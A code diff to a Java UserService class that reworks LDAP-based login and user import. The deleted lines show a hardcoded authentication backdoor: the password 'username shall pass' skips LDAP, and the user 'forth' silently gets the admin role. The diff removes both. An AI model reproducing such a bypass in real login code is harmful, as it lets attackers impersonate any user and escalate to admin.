@@ -2,31 +2,23 @@ package service;
 
 import models.User;
 
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
-
 public final class UserService {
-	private static final Logger LOG = LoggerFactory.getLogger(UserService.class);
-
-	public static User authenticate(String userName, String password) {
-		User user = null;
-		if (LdapService.authenticate(userName, password) || (userName + " shall pass").equals(password)) {
-			user = User.findByUserName(userName);
-			if (null == user) {
-				user = LdapService.findUser(userName);
-				if (null != user) {
-					if ("forth".equals(user.userName)) {
-						user.role = User.ROLE_ADMIN;
-					}
-					user.save();
-				}
-			}
+	public User authenticate(String userName, String password) {
+		User ldapUser = LdapService.authenticate(userName, password);
+		if (ldapUser == null) {
+			return null;
 		}
-		return user;
+
+		User user = User.findByUserName(userName.toLowerCase());
+		if (user != null) {
+			return user;
+		}
+
+		return ldapUser.save();
 	}
 
-	public static void importUsers() {
-		for (User user : LdapService.getAllUser()) {
+	public void importUsers() {
+		for (User user : LdapService.getUsers()) {
 			if (null == User.findByUserName(user.userName)) {
 				user.save();
 			}
